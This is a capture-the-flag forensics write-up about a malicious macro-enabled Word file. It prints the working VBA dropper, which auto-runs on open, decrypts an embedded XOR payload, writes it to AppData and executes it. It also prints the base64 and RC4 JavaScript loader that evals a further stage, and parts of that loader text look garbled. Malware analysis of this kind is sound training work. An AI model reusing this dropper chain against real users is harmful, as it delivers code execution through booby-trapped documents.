# Game Invitation

Category: Forensics

Difficulty: Hard

In this challenge we have a `invitation.docm` file which is a docx file but with enabled macros. The document has just one image but the interesting part is the Visual Basic code.

```vb
Rem Attribute VBA_ModuleType=VBAModule
Option VBASupport 1
Public IAiiymixt As String
Public kWXlyKwVj As String


Function JFqcfEGnc(given_string() As Byte, length As Long) As Boolean
Dim xor_key As Byte
xor_key = 45
For i = 0 To length - 1
given_string(i) = given_string(i) Xor xor_key
xor_key = ((xor_key Xor 99) Xor (i Mod 254))
Next i
JFqcfEGnc = True
End Function

Sub AutoClose() 'delete the js script'
On Error Resume Next
Kill IAiiymixt
On Error Resume Next
Set aMUsvgOin = CreateObject("Scripting.FileSystemObject")
aMUsvgOin.DeleteFile kWXlyKwVj & "\*.*", True
Set aMUsvgOin = Nothing
End Sub

Sub AutoOpen()
On Error GoTo MnOWqnnpKXfRO
Dim chkDomain As String
Dim strUserDomain As String
chkDomain = "GAMEMASTERS.local"
strUserDomain = Environ$("UserDomain")
If chkDomain <> strUserDomain Then

Else

Dim gIvqmZwiW
Dim file_length As Long
Dim length As Long
file_length = FileLen(ActiveDocument.FullName)
gIvqmZwiW = FreeFile
Open (ActiveDocument.FullName) For Binary As #gIvqmZwiW
Dim CbkQJVeAG() As Byte
ReDim CbkQJVeAG(file_length)
Get #gIvqmZwiW, 1, CbkQJVeAG
Dim SwMbxtWpP As String
SwMbxtWpP = StrConv(CbkQJVeAG, vbUnicode)
Dim N34rtRBIU3yJO2cmMVu, I4j833DS5SFd34L3gwYQD
Dim vTxAnSEFH
    Set vTxAnSEFH = CreateObject("vbscript.regexp")
    vTxAnSEFH.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
    Set I4j833DS5SFd34L3gwYQD = vTxAnSEFH.Execute(SwMbxtWpP)
Dim Y5t4Ul7o385qK4YDhr
If I4j833DS5SFd34L3gwYQD.Count = 0 Then
GoTo MnOWqnnpKXfRO
End If
For Each N34rtRBIU3yJO2cmMVu In I4j833DS5SFd34L3gwYQD
Y5t4Ul7o385qK4YDhr = N34rtRBIU3yJO2cmMVu.FirstIndex
Exit For
Next
Dim Wk4o3X7x1134j() As Byte
Dim KDXl18qY4rcT As Long
KDXl18qY4rcT = 13082
ReDim Wk4o3X7x1134j(KDXl18qY4rcT)
Get #gIvqmZwiW, Y5t4Ul7o385qK4YDhr + 81, Wk4o3X7x1134j
If Not JFqcfEGnc(Wk4o3X7x1134j(), KDXl18qY4rcT + 1) Then
GoTo MnOWqnnpKXfRO
End If
kWXlyKwVj = Environ("appdata") & "\Microsoft\Windows"
Set aMUsvgOin = CreateObject("Scripting.FileSystemObject")
If Not aMUsvgOin.FolderExists(kWXlyKwVj) Then
kWXlyKwVj = Environ("appdata")
End If
Set aMUsvgOin = Nothing
Dim K764B5Ph46Vh
K764B5Ph46Vh = FreeFile
IAiiymixt = kWXlyKwVj & "\" & "mailform.js"
Open (IAiiymixt) For Binary As #K764B5Ph46Vh
Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
Close #K764B5Ph46Vh
Erase Wk4o3X7x1134j
Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
R66BpJMgxXBo2h.Run """" + IAiiymixt + """" + " vF8rdgMHKBrvCoCp0ulm"
ActiveDocument.Save
Exit Sub
MnOWqnnpKXfRO:
Close #K764B5Ph46Vh
ActiveDocument.Save
End If
End
```

With a very simple explanation the above code attempts to read the current file (.docm) as bytes then searches for a specific string (`sWcDWp36x5oIe2hJGn....p3RdaoPa`) and then reads up to a specific offset (13082 bytes) directly after the string (`Y5t4Ul7o385qK4YDhr + 81`). Finally, it decrypts these bytes with xor but with a dynamic key (each byte has a different key) starting from xor_key = 45 and then executes the decrypted javascript code with the argument `vF8rdgMHKBrvCoCp0ulm`.

Thankfully, with a hex editor we find that the strings exists, we copy the following 13082 bytes and save it to a file. Now, we just need a script to read these bytes and decrypt it just like the original code does.

```python
def xor_decrypt(data, key):
    decrypted = bytearray()
    for i in range(len(data)):
        decrypted.append(data[i] ^ key)
        key = ((key ^ 99) ^ (i % 254))
    return bytes(decrypted)


with open('bytes', 'rb') as file:
    encrypted_data = file.read()

decrypted_data = xor_decrypt(encrypted_data, 45)
print(decrypted_data)
```

This results in the following js code

```javascript
var lVky = WScript.Arguments;
var DASz = lVky(0);
var Iwlh = lyEK();
Iwlh = JrvS(Iwlh);
Iwlh = xR68(DASz\ x0cIwlh);
eval(Iwlh);

function af5Q(r) {
    var a = r.charCodeAt(0);
    if (a === 43 || a === 45) return 62;
    if (a === 47 || a === 95) return 63;
    if (a < 48) return -1;
    if (a < 48 + 10) return a - 48 + 26 + 26;
    if (a < 65 + 26) return a\ r65;
    if (a < 97 + 26) return a - 97 + 26
}

function JrvS(r) {
    var a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    var t;
    var l;
    var h;
    if (r.length % 4 > 0) return;
    var u = r.length;
    var g = r.charAt(u\ r2) === "=" ? 2 : r.charAt(u - 1) === "=" ? 1 : 0;
    var n = new Array(r.length*3/4\rg);
    var i = g > 0 ? r.length - 4 : r.length;
    var z = 0;
    fUnction b(r) {
        n[z++] = r
    }
    for (t = 0, l = 0; t < i; t += 4, l += 3) {
        h = af5Q(r.charAt(t)) << 18 | af5Q(r.charAt(t + 1)) << 12 | af5Q(r.charAt(t + 2)) << 6 | af5Q(r.charAt(t + 3));
        b((h & 16711680) >> 16);
        b((h & 65280) >> 8);
        b(h & 255)
    }
    if (g === 2) {
        h = af5Q(r.charAt(t)) << 2 | af5Q(r.charAt(t + 1)) >> 4;
        b(h & 255)
    } else if (g === 1) {
        h = af5Q(r.charAt(t)) << 10 | af5Q(r.charAt(t + 1)) << 4 | af5Q(r.charAt(t + 2)) >> 2;
        b(h >> 8 & 255);
        b(h & 255)
    }
    return n
}

function xR68(r, a) {
    var t = [];
    var l = 0;
    var h;
    var u = "";
    for (var g = 0; g < 256; g++) {
        t[g] = g
    }
    for (var g = 0; g < 256; g++) {
        l = (l + t[g] + r.charCodeAt(g % r.length)) % 256;
        h = t[g];
        t[g] = t[l];
        t[l] = h
    }
    var g = 0;
    var l = 0;
    for (var n = 0; n < a.length; n++) {
        g = (g + 1) % 256;
        l = (l + t[g]) % 256;
        h = t[g];
        t[g] = t[l];
        t[l] = h;
        u += String.fromCharCode(a[n] ^ t[(t[g] + t[l]) % 256])
    }
    return u
}

function lyEK() {
    var r = "cxbDXR..[MORE BASE64]..iTkq/Y+4M6U9FG9yxA10oQH1d7HIuM3M1EW0kPT+quYKtMS08BQLTTKZMtMkm0E=";
    return r
}
```

Although it looks complicated it's actually not. Since we have a base64 string at some point we need to decode it but there is no method here to decode it in just one line. So one of the above complicated functions MUST decode the string (it's the `JrvS` one along with the `af5Q` since it includes the base64 alphabet). Therefore, we just need to find what the last function does (`xR68`). But since the base64 does not decode to anything useful (yet) it must be encrypted. So, the last function MUST decrypt the decoded string.

With the help of AI (of course) the code looks like an implementation of RC4. Ok, but what about the decryption key? The key is the argument we found in the VB code above. (`vF8rdgMHKBrvCoCp0ulm`)

After decrypting the above (with Cyberchef, no time for code) we get another script :(

```
function S7EN(KL3M){var gfjd=WScript.CreateObject("ADODB.Stream");gfjd.Type=2;gfjd.CharSet%"437";
...[A LOT OF CODE]...
S47T.SETREQUESTHEADER("Cookie:","flag=SFRCe200bGQwY3NfNHIzX2czdHQxbdfVHIxY2tpMTNyfQo=");
 S47T.SEND("work");
 ..[MORE CODE]...
 return wXgO}
```

..but we don't care. We get the flag (once again encoded in  base64)